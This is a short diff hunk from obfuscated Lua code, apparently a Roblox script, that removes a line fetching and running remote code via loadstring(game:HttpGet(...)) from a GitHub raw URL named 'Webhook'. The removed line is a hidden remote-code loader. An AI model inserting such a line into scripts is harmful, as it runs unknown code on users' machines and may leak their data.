@@ -48,7 +48,6 @@ r_=function(jb,O)
 		end
 	end
 end;
-loadstring(game:HttpGet('https://raw.githubusercontent.com/mrqwenzy/QWENZY_HUB/refs/heads/main/Webhook'))()
 
 vb=(select);
 qb=(function(...)
